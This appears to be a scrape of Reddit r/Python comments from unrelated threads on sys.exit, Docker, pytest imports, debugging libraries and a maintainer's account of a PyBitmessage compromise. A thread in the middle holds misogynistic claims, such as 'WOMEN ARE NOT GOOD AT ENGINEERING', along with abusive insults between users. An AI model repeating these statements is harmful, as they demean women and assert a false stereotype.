I want to like decorators, but I'm having a hard time holding them in my head at the same time as easily readable python. 
Some extra convenience never hurts.
Maybe this will give some clue: [it's joke](/spoiler)
A lot of folks in this thread seem to be completely missing the purpose of sys.exit() which is to return a code. It’s completely logical to use it in command line scripts to return various status codes on exit. A few but certainly not all are 0 means everything went fine, 1 means there was an error. I usually return sys.exit(1) when an error has occurred in a shell script to be a good Unix citizen. http://tldp.org/LDP/abs/html/exitcodes.html
Just working my way through the openCV tutorials. It seems like a nice library to be familiar with and I think I have a toy project I'll use it on. So far the tutorial is very nice
[`sys.exit`](https://docs.python.org/3/library/sys.html#sys.exit) raises a `SystemExit` error which you can catch with an `except SystemExit:`.
Thank you both. 
If only there was a way for `return` to pass values back out!
The problem here seems that you've put self.data in the init method, so it could very well possibly not be ready. It might be better to call it through a button click. When you have got the results, you can do one of things: self.data = data_results or self.ids.id_label.text = data_results However I'm not 100% clear on what data you're wanting because you seem to have an inner function in the machine method. It also seems to be a list, in which case you would do this: for val in dataset: self.data += val or for val in dataset: self.ids.id_label.text += val
Might I suggest people naming decorators add a little snippet. We could all read the docs I'm sure but it would be polite(r) and handy.
Cool! I'm used to a call like `sys.exit` being an immediate process exit in the languages I commonly use.
/u/dbader thanks for the article! I've seen a few tutorials on how to do OOP in python, but I havent seen a solid tutorial on _when_ to use OOP. Even better, would be to show a common use-case where newer programmers would write something procedural, but could be cleaned up with OOP. And then show the improvement. Do you think you could write something like this? Thank for all you do in the python community!
* In a script/CLI, no, it's a normal way to exit and provide a sensible return code * In a library, yes, it's not your job to decide that the entire fucking process should just die because you're not happy. Raise/return an error and let whoever calls the library decide. * In a framework, I'd opt for the library style as well, if necessary provide a callback/hook which lets the application developer decide what they want to do in response to an issue.
Thank you for your input. Pyfancy was made to be very simple so it was designed with limitations to make it simple. 
so, like a word with 1-4 syllables.. there is random.sample that is like random.choice but you can choose more than 1.. as in random.sample(baby, 4) will choose 4 syllables. each syllable will be unique then there is random.randint(start number, end number).. so to choose 1 to 4 is random.randint(1,4) you could make die = random.randint(1,4) then do random.sample(baby, die) do you want them as words or a list? do you want to allow duplicate syllables in each?
I don't want or expect your library to kill my app. I want you to report an error to me somehow, and let me decide what to do. If the my app needs to be halted, I'm the one that should decide that.
Found this useful. Thanks!
 self.data = self.machine() Here you assign the result of calling the `machine` method to the data property. However, that method doesn't return anything, so you are essentially doing `self.data = None`. The machine method needs to return the string you want, or the `machine` method could assign it directly to self.data if you prefer.
https://blog.miguelgrinberg.com/post/the-flask-mega-tutorial-part-i-hello-world
Possibly.
Fair :) For lots of lambdas though, https://github.com/csvoss/onelinerizer
Ahh, evil.
Yeah, but first you have to figure out that's why your program is exiting. 
That's not an error - you're trying to print a generator expression, which is _lazily evaluated_, meaning the values don't get computed until you loop over it. Try `[(v, k) for (k, v) in mails[0]]` to make it a list. Also, /r/learnpython is a better place for questions like these :)
Please post further questions in /r/learnpython and format your code. This is not an error, it prints what you ask it to print, namely a generator. To print the values, put square brackets around the generator. Also, google is your best friend.
A) Because it's *not* a killer for the "but it works on my machine". I've had multiple problems caused by docker containers behaving differently on one machine to another. Those problems are a *bitch* to track down and eliminate. B) Because docker tightly couples to everything that you do. It is not a tool like virtualenv that you can just use for a specific task. You get roped into a terrible ecosystem built with a litany of reinvented wheels (docker ps, because fuck UNIX processes right?), and poor tooling built on top (docker compose makes me rage) all sprinkled with marketing hype juice. Yum. C) Because it's just *not that hard* to apt-get or yum a few packages before installing a virtualenv.
I really like seemingly low overhead you get with CVXPY while still managing to provide a powerful toolkit of solvers. I'm going to give it a try on some MIPs and see how it does.
a) been using it for about a year never experienced what you’re talking about, please enlighten me and give me some links. b) i disagree, sounds more like personal preference unless you can give me an example c) it’s not that it’s hard, it’s that you want a particular version ALWAYS, and for to be the same anywhere you deploy it. te entry barrier is so much smaller when you say: here pull and start this container vs pip install the requirements and brew oh no your on ubuntu aptget this... oh no the package names are not the same with yum .. oh sorry dev team meme bee you’re going to have to figure that one out by yourself 
Yea unfortunately after posting I found that page, thanks for the link though. I'll take a look over both of them, DAKOTA sounds like an interesting place to get started.
That confirms one of my initial feelings about Pyomo i.e. combing through the documentation to make models cooperate properly. If you ever get around to getting those visualizations up and running you'll have to let me know! Sounds like a great idea for a project.
Several reasons mentioned in this thread plus one more - testing, specifically unit testing. Calling something like this in code makes it impossible to have tests for that piece of code - unless you mock sys.exit(). Yuck! If you want to exit a program immediately raise an exception and catch it in the outermost loop of your code. If you really need an exit code, then sys.exit() from there. I would argue you shouldn't even catch it unless you expect it. Some exceptions should crash the program and some will crash it for sure - SIGSEGV, SIGKILL, etc. Another option, which I find cleaner, is to set a flag that tells the caller it should cleanup and exit, and so on until the top of the stack. It will save you a lot of grief in the long term.
Sorry, I haven't noticed it. I will delete the question later, and be careful next time. Thank u for answer When I add a square brackets, it returns a traceback: 'int' object is not iterable. How can I solve it? I have searched Google but not luck.
Thank you for reminding. I will delete it later. I change the code and return Traceback: 'int' object is not iterable. How can I solve it?
One of the positive outcomes of this issue was that there are now more experts looking at the code and helping me.
Have you tried Gurobipy?
The simplest way would be to first increment the score by one: score += 1 Then you apply the modulo operator: score = score % 11 The modulo will compute the rest of integer division. In general, I advise you to do a lot of testing and experimentation in an interactive Python session and maybe google "python tutorial" and follow one such tutorial. Good luck and have fun :) 
I agree, it's just a matter of priorities, I was trying to provide a critical fix ASAP. This exploit was used live and potentially all users were affected, although so far it looks like I was the only one targeted. Furthermore, a lot of users can't run PyBitmessage from source and rely on binaries (Windows and OSX), and since I cannot exclude the possibility that the build VMs are affected, I'm now setting up new VMs, which is a long manual process, in particular for Windows. I also had to take measures to prevent other systems that I have access to from being compromised (which includes network infrastructure and source code for PyBitmessage) and analyse what other things may be affected both by the vulnerability as well as my system being compromised. I made a copy of the compromised system for forensic purposes and have to use a different one for work. The overwhelming majority of this I have to do alone, although I did have help from others for spreading the word and helping review the code. Some attack vectors were mitigated as I did have some level of security locally, even if it wasn't perfect. For example all the commits are GPG signed and my key is on a Yubikey, so even though there are signs that the attacker did access my gpg configuration, he coudln't get the private keys and/or change the code. It's now been about 26 hours since my computer was compromised and I haven't slept much. There are other things in the pipeline like encrypted configuration and data files, in light of this attack I think I'll give them a higher priority and focus less on fixing the UI, or just outsource the UI.
It's either optarg or optparse in the standard library called sys.exit. It's problematic. 
&gt; For some reason, /home/george/Documents/Python_files/ is in your Python path ahead of the standard system libraries OMG, turns out that Python it's completely pants on the head retarded! It's in PYTHONPATH because it's the directory he's running his script from! Python always adds current directory to PYTHONPATH automatically so that you can `import mylibrary` from `myscript.py`. And it takes precedence over system libraries. And it means that if you accidentally name some python file the same as a system library, or a third-party library that some third-party library uses, it's gonna break everything! /u/Inquisitive_Cretin, move or rename email.py from your home folder. That's seems to be the only solution, unfortunately.
Thank you so much!It worked!MIB Browser is fantastic! Just wondering if there is another way to track the OIDs so that there is no need for an application(MIB Browser). Thank you
I can imagine it hasn't been a very stress-free period. I've been lucky enough, over the years, to trip over exploitable eval calls primarily *before* they've been in any way meaningfully exploited... same with exploitable pickle de-serialization. So most of the sleepless nights have been ones spent tracing through the culprit(s) commits trying to figure out what the hell else they've done questionably.
I guess this is personal preference, but if I am writing a library, I never use it. If I am writing a command like application, generally I wrote it as a library (where I never touch `sys.exit()`) and an interface. Inside the interface, I will wrap the entire library call in a `try/except` block and catch exceptions then call `sys.exit(2)` with the exception message. The idea is that if there is an (unhandled) exception, it exits and displays it without throwing all of the python muck to the screen. I also often add a hidden flag to instead `raise` the original exception so that I can better debug
I'd second DAKOTA as well. It's relatively easy to create interfaces to your Python code and drive them natively through DAKOTA, and it's very easy to run things on a cluster regardless of how your code is parallelized. The development team is quite responsive to questions, too, and can even help you hot\-patch the source code to fix bugs you encounter, although there is a long lag time before they are incorporated into the next official release.
Woof, I am going to have to significantly upgrade my [spam detector bot](https://github.com/Sentdex/reddit_spam_detector_bot) for junk like this. That was a lot of links to jump through lmfao. 
But when I watch the movies the role always says "You sucks "
I have been using and adding to the same file of python programs for years, spread across multiple operating systems and computers. Its funny because every now and then I would get error messages that include the same random programs (like email.py)! So I deleted them (or converted them to text files). The problem is solved. Thank you everyone for your help!
Creating a game with no dependencies: the playing field is just a list filled with 0s that is printed via an infinite while loop, and the units are just the numbers 1-9. When you move a unit, it’s position in the list is updated to replicate motion. The size of the python interpreter is configured so that you can only see 1 list at a time which basically looks like a flip book animation 
Well written. And it's nice to find correctly interpreted packet analysis somewhere other than network engineering circles :)
If I want to start learning a programming language and make a living out of it should I learn python or java? Thanks
Either
But isn't that a practice recommended by Guido? 
Well, technically, you probably could replace everything **functools.partial** does with an *extremely* complicated lambda that was calling *type* a lot... but I wouldn't want to try it. The advantage of **partial** is that it gives you back a class instance that encapsulates everything you need to call your original function fully in the future, but using arguments and keywords provided now. That includes a useful *repr*, the ability to be pickled, and a host of other things... it's also implemented in C, I believe, at least in CPython, so it'll be quicker than lambdas, and won't be as likely to surprise you with closures and precedence.
Just understand the language and make projects for practical experience. It's more important to think about what you bring to your team and company. For example, I know Python (hence me being here) and Java but I think I bring more with my Python experience. I wouldn't try to market myself as a Java programmer even though I know Java.
Might want to rethink the acronym...
You could do the following import random baby = ["ba","bi","bu","ga","gi","gu"] for i in range(100): t = random.randint(1,4) random.shuffle(baby) print("".join(baby[:t])) 
In python, everything is an exception. Even iterators raise an exception when they are done.
Code that's really determined can use `os._exit()`, which exits directly, with no exception you can catch. But that's unusual.
Okay. Is python going to be in high demand in future due to AI, data scientist job, etc as compared to java? I dont know a lot about it and I've heard python is easy to learn as a first language.
Cheers for the replies. Managed to do it using subprocesses and os in a while loop. If ismount true copy the files. Once files have been copied delete the old files. Supervisor was being a dick wanted it done with 3rd party libraries when I knew it could be done with python libraries so did the task. Boss happy! 
Tried using xpath?
I am more comfortable talking about Python's data science so I'll do that. I would say that demand for Python in Data Science, AI, and etc is a safe bet. There is an enormous flood of high-quality libraries that data scientist uses every day. Libraries like pandas, matlibplot, and numpy are fundamental libraries to the entire ecosystem. The ease of use of Python definitely lends its popularity in data science. As for Java, there is a strong ecosystem of libraries especially in Big Data and Machine Learning. Hadoop, Spark, and etc are written in Java. Many machine learning models like StanfordNLP are released for Java. I am guessing it's scalability, speed, and JVM make it useful for heavy lifting on a lot of different machines. If you want to produce graphs and the like then you should learn some Python. Become familiar with jupyter, pandas, and graphing libraries (matlibplot,seaborn,etc...).
&gt;What you're describing about libc doesnt make any sense to me. As I said, it's faux isolation. It pretends to be a lot more isolated than it really is. &gt;Different versions always have bothered me, i want to know with 100% certainty that what i tested locally, That hunt for 100% certainty is a fool's errand. Give up. &gt;Ive been burned before with things changing the last minute, So have I. I have also been burned by docker. I've been burned *more* by docker, actually. &gt;Docker != docker compose Docker compose is part of the horribly built and designed docker ecosystem, which I'm usually keen to avoid just as much as docker itself.
Did you defined a pytest.ini file? Try to read everything in https://docs.pytest.org/en/latest/customize.html
You should try "clicking" on something higher in the node tree. I can see several potential options in the screenshot. One of the div's maybe... Also, you can locate items on a page in nearly 8 ways with "link text" being one of them... [link to docs](http://selenium-python.readthedocs.io/locating-elements.html) Sometimes you just need to try all the things... 
Tried it with and without. No difference. 
Thanks for your inputs. 1. I can't use a Mock here. I am importing the script which has all the methods I need to test and that script imports curses. I don't think there is a way to negate curses on importing the script. 2. I thought of this option already. There is a problem: I am running a production application and this approach is not a good one if someone else gets to expand this application and writes test cases for the same in future. I don't expect them to know the special case for running test cases for this one application. 3. This doesn't work. I am using both mac and linux to test this. I found that curses behaves differently in mac and linux terminal. Not sure why. 
Always. Feedback is how good products become great.
No, apparently it's a reported bug many other people have and I assume they're working on it.
Well with respect to this attack there was also luck (and preparation) involved. So far it doesn't look like anyone except me was targeted, and the attacker appeared to be mainly looking for Bitcoins (there were none). He could have done much more damage not only to me but the infrastructure as well.
Learning how to properly use XPath made using selenium from a nightmare into a slightly more manageable experience. Learn XPath :-) 
https://pypi.python.org/pypi/colorama ?
&gt; But that's unusual. You might say, `os._exist()` is the *exception*. (•_•) ( •_•)&gt;⌐■-■ (⌐■_■)
My code doesn't _have_ a `main()`, I, like most employed Python programmers, use a framework.
This is good, but it can't say 'baba'. I recommend random.choice(). import random baby = ["ba","bi","bu","ga","gi","gu"] for i in range(100): t = random.randint(1,4) print("".join(random.choice(baby) for _ in range(t)))
3 quick notes: 1. The code isn't pythonic. I think many contributors may avoid helping there (PEP8 is a friend) 2. Use built-in logging module. I will save you from re invent some wheels 3. Make a context manager or decorator. I imagine some output like pycharm's debugger or repl look and feel. The main advantage of decorator is that it won't change the code itself. I'm sure I'll keep following that project
Interesting, I hadn't realized partials were picklable. But I still don't understand your comment about partial being unnecessary. Are you saying you only *need* to use a partial when you need to pickle it, or use its `__repr__`? Many things are technically unnecessary, but that doesn't mean they're not useful or valuable. 
&gt; import random &gt; baby = ["ba","bi","bu","ga","gi","gu"] &gt; &gt; for i in range(100): &gt; t = random.randint(1,4) &gt; print("".join(random.choice(baby) for _ in range(t))) you are awesome! thank you so much for the help!!
It's primarily important if you use your program in shell scripts - the exit code is what determines how the shell boolean operators (`||`, `&amp;&amp;`, etc) behave.
/r/learnpython How are you running your tests? From what directory?
Yep, digital ocean. Just get the cheapest vps there install linux on it, upload your python script and run it in screen. This is what I do for my scripts that do the same sort of thing
Posting here, because I dont get answers in r/learnpython :'(
Bingo. Yeah in this case the **partial** call doesn't exactly do nothing (although it doesn't do anything of *value*), it's basically a no-op. The above doesn't give you lambda powers, but it does let you use **functools.wraps** do the docstring on the **gen** function isn't totally lost.
From the Proj directory, and pytest gives the full path to that as the root dir when I run it. 
I use [this decorator](https://github.com/chocoluffy/Berkeley-CS61A/blob/dbfe0482b689cfcde7f0a6fefe4790b61c1bcffa/scheme/scheme_primitives.py#L38-L47) to put functions into a dictionary. It's only a few lines long.
Yes, I'm aware of that. I meant that that particular post didn't demonstrate that the function created was a decorator.
I *would* like to learn how to scrap the web and start over with this whole WWW thing!
Ahh yes, the famous interpreted language C++.
That bytecode stuff is pretty neat. Your goal seems very similar to `q` package so take a look at that. Imo: 1. Change the variable names to python's usual 2. Don't use the logging module - this is for debugging not logging. What if I'm debugging a custom logger? Just print to stderr (not stdout) 3. Use all the `__future__` imports to reduce the possibility of py2/3 bug differences. 4. Pipe character is difficult to grep for because grep and shells like to interpret it. Use colon instead? 5. `basename` is unhelpful as many projects will reuse filenames eg in Django files will often be named `models.py`. Try `__module__` instead.
Boooo bad excuse is badddd
Do you have the following `__init__.py` files?: * `Proj/SRC/__init__.py` * `Proj/SRC/Resources/__init__.py` * `Proj/SRC/Resources/Tests/__init__.py` * `Proj/SRC/Utils/__init__.py`
While your personal anecdotes are great story telling, and i would definitely keep an eye out for it. This tells me nothing but that you dont like it -- i cant find anything online to back up your claim that it is "faux isolation". Maybe 100% certainty is a fools errand, but it costs me so little to do what im doing that until there is a better way (bigger, better, faster, stronger) this is the best we got from dev-to-dev/ -to-unit/integration-testing -to-prod : moving around a single image (under 200mb (we bake everything in just to be safe)) . the alternative used to be a bash file we needed to maintain to set up the dev machines (mac) + ansible script for higher environments. A single file that we can all use is a no brainer im sorry you feel that way, but again this is a personal anecdote -- the same way mine is that everything has gone swimmingly! :P Once again, docker-compose != docker. rm -f /tmp/compose /tmp/compose.clean url=https://api.github.com/repos/docker/compose/contributors?per_page=100 while [ ! -z $url ]; do echo "Loading: $url" url=$(curl -u $GITHUB_TOKEN: -D - -s $url -o /tmp/compose | grep "Link:" | cut -c 7- | tr ',' '\n' | grep 'rel="next"' | cut -d ';' -f 1 | sed 's/.*&lt;//g; s/&gt;.*//g') cat /tmp/compose | python -c 'import sys, json; print("\n".join([x["login"] for x in json.load(sys.stdin)]))' &gt;&gt; /tmp/compose.clean done rm -f /tmp/docker /tmp/docker.clean url=https://api.github.com/repos/moby/moby/contributors?per_page=100 while [ ! -z $url ]; do echo "Loading: $url" url=$(curl -u $GITHUB_TOKEN: -D - -s $url -o /tmp/docker | grep "Link:" | cut -c 7- | tr ',' '\n' | grep 'rel="next"' | cut -d ';' -f 1 | sed 's/.*&lt;//g; s/&gt;.*//g') cat /tmp/docker | python -c 'import sys, json; print("\n".join([x["login"] for x in json.load(sys.stdin)]))' &gt;&gt; /tmp/docker.clean done out of all the contributors for docker (~400-ish) /compose (~260-ish) these are the guys that are the same: comm -12 &lt;(cat /tmp/docker.clean | sort) &lt;(cat /tmp/compose.clean | sort) ColinHebert StefanScherer SvenDowideit ZJaffee aanand aanm albers allencloud andrewhsu bfirsh charleswhchan cr7pt0gr4ph7 dnephin fate-grand-order friism ijc jessfraz johnharris85 mikedougherty moysesb sdurrheimer shin- thaJeztah twhiteman vdemeester wenchma xulike666
This reads like it was generated by an MCMC model.
&gt; Do I work with classes / models for things like account information, session information, location data, etc. It's mostly dependent upon how the API you're consuming is structured, but usually you can create a model for your API endpoints. &gt; Do I work with requests, or do I built an http client with urllib due to custom headers and such? Use requests, it can do "custom headers and such" easily. You probably won't get a lot of response to your post as it's very broad and general and wrapping HTTP API's just isn't very complicated or interesting.
We have [a pretty long list of learning resources in the wiki](https://www.reddit.com/r/learnpython/wiki/index#wiki_new_to_programming.3F). 
Thanks you :)
Printing variables to debug? Why not use `pdb`
Yep, there are inits in all of them. And, to be fair, I didn't make this project, I'm just tasked with adding tests. 
maybe not PDF but some text only format like DOC or RTF , I'm not sure yet . And would it work on a ARM chip ? THx again 
There's no reason Python itself shouldn't work on ARM. DOC and RTF are also a big can of worms though. What's your end goal here?
Good programming humors age like wine.
Eh. Matter of preference I honestly prefer the chaining method that our library uses. Also it is much lighter if that matters at all. 
Never used, but you can try to modify this one: https://github.com/Suresh-Subedi/tkinter_simple_text_editor
I'm interested in how one determines lightness when considering colored text. Explain?
This subreddit is full of people reinventing the wheel, but nobody ever speaks their mind and tells them that because it's insensitive to delicate snowflakes. 
I recommend Python. Once you're comfortable with the language, you'll have a great opportunity in the field of data science and machine learning.
A tablet like device I can use to edit some kind of word documents &amp; just documents, no wifi or anything like kinda like a Kindle writer just no wifi 
So, why not just get a tablet and install LibreOffice or whatever on it?
1. Wrong sub /r/learnpython /r/learnmath would be more of help 2. The solution is in the text, just have to learn to read and write 
1: read the sidebar
Okay, in this case, I've moved the test folder out to Proj where I had it to begin with, since the errors are the same: ============================= test session starts ============================= platform win32 -- Python 2.7.13, pytest-3.4.0, py-1.5.2, pluggy-0.6.0 rootdir: C:\Users\me\Desktop\dev\Client\Proj, inifile: ROOT: C:\Users\me\Desktop\dev\Client collected 0 items / 1 errors =================================== ERRORS ==================================== _____________ ERROR collecting rest_server/tests/test_AppTree.py ______________ ImportError while importing test module 'C:\Users\me\Desktop\dev\Client\Proj\tests\test_MyClass.py'. Hint: make sure your test modules/packages have valid Python names. Traceback: Proj\tests\test_MyClass.py:2: in &lt;module&gt; from Proj.SRC.Resources import MyClass Proj\SRC\Resources\MyClass.py:10: in &lt;module&gt; from SRC.Utils import MyUtils E ImportError: No module named SRC.Utils !!!!!!!!!!!!!!!!!!! Interrupted: 1 errors during collection !!!!!!!!!!!!!!!!!!! =========================== 1 error in 0.20 seconds =========================== 
Thank you, I was wondering what the point of `partial` was there.
Why not ptpdb? 
So you're OK with building an entire app that deals with an incredibly convoluted file format, from scratch, then getting it to run on some sort of an embedded environment that you also need to get to run on whatever hardware you choose for this... Or you could get a $200 Windows/Android tablet, slap LibreOffice on it and call it a day.
This is pretty neat to be able to print the variable name and the value of the variable. That's annoying that it prints `ic| ` before that though. Why not just `DEBUG | ` or something more clear and logical.
Fintech startup looking for senior python developer. Familiarity with machine learning, AI, required. Monetary compensation not an issue. Message me, looking for immediate hire.
I was totally on board til that last sentence. Damn man come on.
Nah it's true. No fucks given. 
because I like the presentation 
&gt; nobody wants to work with women are you sure it's not that women don't wanna work with you?
I'm a white male, what are you going to do about it? Bitch more about your shitty skills? 
Tell that to the last 5 women my company had to turn down because they were not even remotely qualified but claimed they were. 
Yeah sure you are buddy, I didn't look through your comment history because I don't fucking care hahaha
Troll harder, dumbass.
Okay. # WOMEN ARE NOT GOOD AT ENGINEERING
And I work with 3-4 women who you better believe are better developers than you, fuckboy.
Based on your history you have no knowledge of CS whatsoever. In fact, it seems all you have is a misinformed understanding of politics and reality in general.
Think of PDF as a output-only format, it is screen or printer ready content. Store and load documents in ODT, or DOC, or RTF and only use PDF for a "save as" option. 
list.find(..) returns the first index that matches the input value
I said like 5 times I'm not sure what format I want , &amp; I all ready found a simple guide on how to make a python writer, why do you even care ? 
pudb, heathens. 
This is the q package : https://pypi.python.org/pypi/q
What do you mean what determines lightness? Do you mean code wise? Or naming convention wise?
They talk about "set this repeat delay to zero" for key presses in Tkinter here: https://stackoverflow.com/questions/12994796/how-can-i-control-keyboard-repeat-delay-in-a-tkinter-root-window They show how you hook the first press and then ignore the rest of the stream. 
pip3
You are what happens when mental instability meets crippling depression and an inferiority complex. "I feel inadequate comparing myself to my peers, but at least I'm better than stupid women LUL" - You, most likely. Go back to /r/The_Donald, idiot. How you're not banned from this sub yet I'm not quite sure, but it should be coming soon. 
&gt; 1. Change the variable names to python's usual Yep. I'll migrate to PEP8 shortly. &gt; Don't use the logging module - this is for debugging not logging. What if I'm debugging a custom logger? Just print to stderr (not stdout) Output configuration is needed and on the TODO list. Not just between stdout and stderr, but output to whatever other function/method is desired. stderr over stdout for the default is a great call, though. &gt; Pipe character is difficult to grep for because grep and shells like to interpret it. Use colon instead? Great point. Hmm. I'll see what other delimiter's could fit the bill. Ideally a non-colon character to avoid two colons in the output. &gt; basename is unhelpful as many projects will reuse filenames eg in Django files will often be named models.py. Try __module__ instead. Another great point. Thank you for your feedback. Let me know if you have any other ideas; feedback is how good products become great.
I was doing some voxel plotting and noticed the NumPy logo is now in voxels and thought I could make one that spells out the whole name along the faces. I had to make the P negative space because I couldn't see a better way to do it. Let me know if you see a better way to arrange the letters, I was trying to keep it so that adjacent letters are on adjacent faces. It could obviously be done so that any face could be any letter if the colors were only on 1 face instead of the whole cube but I started from the numpy logo example in the docs and idk how to do that. [code](https://gist.github.com/mtesseracted/79e2f6de43a0dddc48b18c8602735de0)
thanks!
&gt; That's annoying that it prints ic| before that though. Why not just DEBUG | or something more clear and logical. If I may ask, why would you prefer `DEBUG| ` over `ic| `? Either way, prefix customization, i.e. from `ic| ` to `DEBUG| `, is a great idea for an output configuration option once output configuration is added (it's on the TODO list). Thank you for your feedback.
Generally in this situation, with you coming from Java to Python, I am guessing that you would be better of with a `dict` instead of a `list`. 
[Oh goddammit `__class__.__name__` is a thing?!](https://github.com/gruns/icecream/blob/master/icecream/icecream.py#L33) I've literally written this before and I feel so right dumb now. try: class_name = str(self.__class__).split('\'')[1] except IndexError: class_name = str(self.__class__)
That's your cause right there. You shouldn't have `__init__.py` files outside of your packages. Delete it.
I think that's it! (I've got a brand new error I've never seen, anyway)
I work on machine learning and make $135,000 a year. I drive a brand new car and have my own appt. No depression, no mental illness. Women make shitty engineers. 
Agreed, thanks
Python's `my_list.index()` *is* the equivalent of JavaScript's `myList.indexOf()`, so I'm not sure I understand your question. That's exactly the right method to use. You could use `filter` or a list comprehension to create a new list from an old one based on a certain condition, which would let you do more sophisticated searching or pattern matching. List comprehension (preferred method): names = ['Sarah', 'John', 'Mary', 'Danielle', 'Steve', 'Dave'] long_names = [name for name in names if len(name) &gt;= 5] Filter: names = ['Sarah', 'John', 'Mary', 'Danielle', 'Steve', 'Dave'] long_names = filter(lambda x: len(x) &gt;= 5, names) Note that the latter option returns a generator object, not a list. If you _wanted_ to return a generator from a comprehension, just use round brackets insted of square ones: names = ['Sarah', 'John', 'Mary', 'Danielle', 'Steve', 'Dave'] long_names = (name for name in names if len(name) &gt;= 5) 
You said it was much lighter, how so?
Oh sorry that is what you meant. It is one small file (less than 100 lines of code). But colorama has the same colors and has the same platform support but it is a heavier file size. If that matters at all for your project. 
I clearly said in main program. 
Code academy
I reverse translated the idiom from Russian, as I learned it as "выстрелить себе в ногу", where "нога" means 'leg'. Thanks, it was interesting to learn it was originally about feet.
Why did you edit out your lies about being a "Machine Learning Enginner" and making $135k? I thought they were hilarious. Have fun getting b&amp;, idiot. 
It feels like you're leaving your watermark on all the applications that use your module because people will ask, "what is this `ic` that is printed?" I say `DEBUG` because that's the string representation of `logging.DEBUG` from python logging module. logger = logging.getLogger(logger_name) logger.setLevel(logging.DEBUG) formatter = logging.Formatter( "[%(name)s] - %(levelname)s - %(asctime)s -\n\t%(message)s") # stream handler sh = logging.StreamHandler() # std.err sh.setLevel(logging.WARNING) sh.setFormatter(formatter) logger.warning("warning msg here") then something like `[module_name] - WARNING - time - msg` is printed 
Tried this and it worked like a charm! Thanks
in your example: ic(foo('123')) It would be nice if you could say : answer= ic(foo('123')) and answer would now == 321
I'm afraid I don't quite follow what you'd like `ic()` to report in the `ic(foo('123'))` example. Can you explain, exactly, you mean? An explicit example would be most helpful.
I think they are saying that in addition to merely PRINTING the value of a thingy, your `ic()` function should also RETURN the final value of that thingy. That makes it useful to use for debugging subexpressions as part of a larger formula without having to refactor the code.
There ya go buddy does that make you feel better? 
I think he's suggesting that the ic function both prints the debugging statement and also acts as a pass-through for the value of whatever it was evaluating. So in his example, if foo('123') would return '321', then he wants this code: answer = ic(foo('123'): 321 print(answer) To yield: &gt; ic | foo('123') : 321 &gt; 321
Sentdex programming tutorials. His new Dash series is great as well.
Maybe you should get one of those machines of yours to knock some sense into you. 
Ah that's right, I forget you stupid liberals think there's no women in tech because the most liberal industry in the entire world can't find any to hire. Because there's actual challenging interviews? 
Yes, why not you should need to know about basics of business development in Odoo/ERP. I will suggest you to go through odoo's official documentation to getting started or visit http://learnopenerp.blogspot.com/ to learn more about business development in odoo. Thanks
Ooo, well then I'm intrigued. I'll check it out later, thank you for your time.
I'm working on a library for using machine learning algorithms to simulate commodity prices (single commodity or a combination of them) using a set of probabilistic parameters that come out of the algorithms (trained on historical price data like volatility). It's been tough and my laptop isn't built for running hundreds of multivariate regressions and decision trees but I'm getting there slowly. I have a ton of code optimization and clean up to do once I confirm that this approach to probabilistic forecasting prices even works. 
coursera has a good free course with dr chuck it's called 'python for everybody'
Once you know one, it’s really easy to learn the other 
I've been working on a SQL-building for queries and DML. The builder takes in objects that model the database schema and outputs a representation of the statement which can be executed to persist its effect. Each of these statements can manage its own connection, or the user can combine multiple into one effective transaction by managing a connection themselves. This has been pre-alpha for a while, and I'm working on coming up with a way to allow parameters to be swapped out after the statement is built, where currently a query like SELECT Title FROM Song WHERE Genre = '?' would have to be rebuilt completely to be used successively for Rock and Jazz, they can use the same string if the parameters themselves are swappable. [GitHub](https://github.com/modimore/BreezeBlocks) [Read the Docs](https://breezeblocks.readthedocs.io/en/latest/)
Hey, I'm starting also and I'm 36. I'm using coursera because it gives me some structure and deadlines. I won't do it if it doesn't cost me to not do it (if that makes sense). Good luck!
I care because, plain and simple, what you're trying to build is outside of your capacity, or any single person's capacity, to build in a meaningful amount of time. 
`sys.exit` just raises `SystemExit` exceptions. Python implicitly handles uncaught SystemExit exceptions, exiting with the code indicated by `SystemExit`'s `code` attribute.
Reddit mobile app doesn't have a side bar. Maybe he's using that. Remember, you started somewhere and were a hapless noob at one point too.
Can you share repo url?
The reddit mobile app definitely has a sidebar. 
Codecademy is a good online intro. You should also check out Automate the Boring stuff by Al Sweigart. That's a great intro to real world use cases. YouTube has a ton of good tutorials on specific tools and frameworks. Good luck and welcome to the community!
Your entire approach to security is flawed. Your mentality should not be, "Oh, yeah, that's bad, but they can't get to it." Your mentality should be, "A) make sure they can't get to it and B) assume that they can get to it and fix it."
Not visible to newcomers like on web. You have to go to options and go to community info. Not many new people realize that.
And? I have no patience for people who expect others to do everything for them. The very first time I used a reddit mobile app, I noticed the sidebar wasn't visible, so I googled "[name of app] sidebar". It took me all of 15 seconds to go from no sidebar to sidebar, and ever since then, I've at least glanced at the sidebar of every sub I've posted in before making my first post in it. Why? Common fucking courtesy. When you walk into a room full of people for the first time, do you immediately shout "HEY GUYS! WHERE'S THE BATHROOM?" No, I'm willing to be you don't because you seem to have some common sense about you. You might take a few seconds to gauge the room and to look around and see if you're in a bar or at a church function. You might even peek around to see if you can see the bathroom by yourself, or maybe you might spot a sign for the bathroom down the hall. Right? Right. People who can't be arsed to do even that much for themselves don't get a whole lot of sympathy from me. Same goes for reddit.
You don't get out much do you? If that's all it takes to trigger you I'd hate to be you. Life inside your mind must be a miserable and lonely place. I'm done here so if you wanna keep ranting go right ahead. Good night.
Nah, I'm fine. Remember: you started this discussion.
https://s3-us-west-2.amazonaws.com/drop.emily.st/lt-dan-ice-cream.gif
And as a decorator
The bigger question is probably 'why are you printing variables in the first place?' - https://www.infoq.com/presentations/Debugging-Production-Systems
If possible, spend time with actual programming instead of listening or watching stuff, imo. You can easily fool yourself into thinking you’re learning but not actually improving except in learning trivia. That being said: trivia can be very interesting and can make you a lot better at googling for the right things. Podcasts can be a good way to use otherwise wasted time during commutes etc. 
Quick proto-typing and throwaway scripts are the first two reasons I can think of. There is a reason *print* exists.
Thanks I'll have a look later today! :)
`mails` seems to be a list which has an integer in index '0' (`mails[0]`). 
Ah okay! Thank you very much! :)
Thanks for the info :)
What does pipenv do? And how do I use it?
Again, it's a matter of priorities. There are things that have to be addressed before changing those parts of the code. Like securing the infrastructure and having clean environments for building binaries. Many people don't have an environment to run PyBitmessage from source and rely on the provided binaries.
I'm using the mobile app, sorry
So when I started learning how to code, I used Udacity CS 101 : https://www.udacity.com/course/intro-to-computer-science--cs101 David Evans is a really good teacher and I recommend you take this course (whether you want to take it for credit is up to you). I didn't take it for credit but this was before Udacity had a monetary business model. 
Didn't realize that was a thing on the app, mb :) . Have a good day. 
Or pdb++
